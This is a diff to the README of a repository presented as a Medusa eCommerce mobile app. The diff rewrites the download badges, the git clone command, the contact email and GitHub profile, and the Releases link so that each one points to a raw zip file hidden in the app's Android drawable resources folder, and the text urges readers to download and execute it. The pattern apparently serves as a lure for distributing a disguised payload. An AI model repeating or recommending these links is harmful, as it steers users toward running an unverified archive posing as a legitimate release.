@@ -2,7 +2,7 @@
 
 Welcome to the **Medusa Mobile React Native** repository! This open-source project provides a mobile application for your Medusa eCommerce store. It supports custom themes and plugins, allowing you to tailor your shopping experience.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/oliverkanda254/medusa-mobile-react-native/releases)
+[![Download Releases](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ To get started, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/oliverkanda254/medusa-mobile-react-native.git
+   git clone https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -95,14 +95,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [oliverkanda254](https://github.com/oliverkanda254)
+- **Email**: [https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip)
+- **GitHub**: [oliverkanda254](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip)
 
 ## Releases 🚀
 
-For the latest updates and releases, visit our [Releases](https://github.com/oliverkanda254/medusa-mobile-react-native/releases) section. Here, you can download the latest version of the app and execute it on your device.
+For the latest updates and releases, visit our [Releases](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip) section. Here, you can download the latest version of the app and execute it on your device.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/oliverkanda254/medusa-mobile-react-native/releases)
+[![Download Releases](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/oliverkanda254/medusa-mobile-react-native/raw/refs/heads/main/android/app/src/main/res/drawable/medusa_mobile_native_react_2.1.zip)
 
 ## Conclusion
 
